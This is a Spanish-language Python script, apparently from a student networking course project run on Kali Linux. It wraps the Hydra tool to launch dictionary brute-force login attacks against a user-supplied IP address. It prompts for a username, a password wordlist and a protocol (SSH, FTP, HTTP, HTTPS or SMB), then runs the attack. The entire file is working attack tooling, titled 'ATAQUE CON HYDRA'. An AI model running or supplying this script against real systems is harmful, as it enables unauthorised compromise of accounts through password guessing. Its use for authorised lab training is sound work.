#!/usr/bin/env python3
import os
import subprocess

def seleccionar_diccionario(diccionario_dir):
    archivos = [f for f in os.listdir(diccionario_dir) if f.endswith('.txt') or f.endswith('.lst')]
    if not archivos:
        print("No se encontraron diccionarios .txt o .lst en la carpeta.")
        return None

    print("\nDiccionarios disponibles:")
    for i, archivo in enumerate(archivos, 1):
        print(f"  {i}. {archivo}")

    while True:
        try:
            opcion = int(input("\nSelecciona el número del diccionario a usar: "))
            if 1 <= opcion <= len(archivos):
                return os.path.join(diccionario_dir, archivos[opcion - 1])
            else:
                print("Opción inválida.")
        except ValueError:
            print("Introduce un número válido.")

def seleccionar_protocolo():
    protocolos = ["ssh", "ftp", "http", "https", "smb"]
    print("\nProtocolos disponibles:")
    for i, protocolo in enumerate(protocolos, 1):
        print(f"  {i}. {protocolo.upper()}")

    while True:
        try:
            opcion = int(input("\nSelecciona el número del protocolo a usar: "))
            if 1 <= opcion <= len(protocolos):
                return protocolos[opcion - 1]
            else:
                print("Opción inválida.")
        except ValueError:
            print("Introduce un número válido.")

def main():
    # Limpiar la pantalla para mejorar la visibilidad
    os.system('clear')

    print("╔══════════════════════════════════════╗")
    print("║        ATAQUE CON HYDRA              ║")
    print("╚══════════════════════════════════════╝")

    # Cambiar esta ruta si lo necesitas
    diccionario_dir = "/home/kali/Proyecto-ASIR2/diccionarios"

    # Preguntar por IP de destino
    ip = input("\nIntroduce la IP de destino (ej. 192.168.122.37): ").strip()
    if not ip:
        print("IP no válida.")
        return

    # Preguntar por nombre de usuario
    usuario = input("Introduce el nombre de usuario (por defecto: debian): ").strip()
    if not usuario:
        usuario = "debian"

    # Seleccionar diccionario
    diccionario = seleccionar_diccionario(diccionario_dir)
    if not diccionario:
        return

    # Seleccionar protocolo
    protocolo = seleccionar_protocolo()

    # Construir y ejecutar el comando
    print("\nIniciando ataque con Hydra...\n")
    comando = [
        "hydra",
        "-l", usuario,
        "-P", diccionario,
        f"{protocolo}://{ip}"
    ]

    subprocess.run(comando)

if __name__ == "__main__":
    main()

